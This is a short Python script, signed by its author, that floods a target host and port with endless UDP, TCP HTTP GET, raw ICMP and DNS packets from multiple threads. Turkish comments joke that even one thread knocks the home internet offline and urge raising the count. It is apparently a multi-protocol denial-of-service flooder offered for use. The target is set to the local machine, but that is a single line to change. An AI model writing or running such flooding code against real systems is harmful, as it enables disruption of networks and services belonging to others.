#by S3ns1l1ss
import socket
import threading
import struct

target_host = "127.0.0.1"  # salla
target_port = 9999          # geç

def send_udp():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = b"Test UDP packet"
            client.sendto(message, (target_host, target_port))
            print("[*] UDP packet sent")
        except Exception as e:
            print(f"[!] UDP Error: {e}")

def send_tcp():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_host, target_port))
            message = b"GET / HTTP/1.1\r\nHost: " + target_host.encode() + b"\r\n\r\n"
            client.send(message)
            print("[*] TCP packet sent")
            client.close()
        except Exception as e:
            print(f"[!] TCP Error: {e}")

def send_icmp():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            message = b"Test ICMP packet"
            client.sendto(message, (target_host, target_port))
            print("[*] ICMP packet sent")
        except Exception as e:
            print(f"[!] ICMP Error: {e}")

def send_dns():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            message = struct.pack(">H H H H H", 1, 0, 1, 0, 0) + b"\x03www\x04test\x03com\x00\x00\x01\x00\x01"
            client.sendto(message, (target_host, target_port))
            print("[*] DNS query sent")
        except Exception as e:
            print(f"[!] DNS Error: {e}")

def run_requests(num_threads):
    for i in range(num_threads):
        udp_thread = threading.Thread(target=send_udp)
        tcp_thread = threading.Thread(target=send_tcp)
        icmp_thread = threading.Thread(target=send_icmp)
        dns_thread = threading.Thread(target=send_dns)

        udp_thread.start()
        tcp_thread.start()
        icmp_thread.start()
        dns_thread.start()

if __name__ == "__main__":
    # elleme olm 1 yapınca evin interneti çöküyör ha 4 olmadımı kökle .d
    run_requests(4)
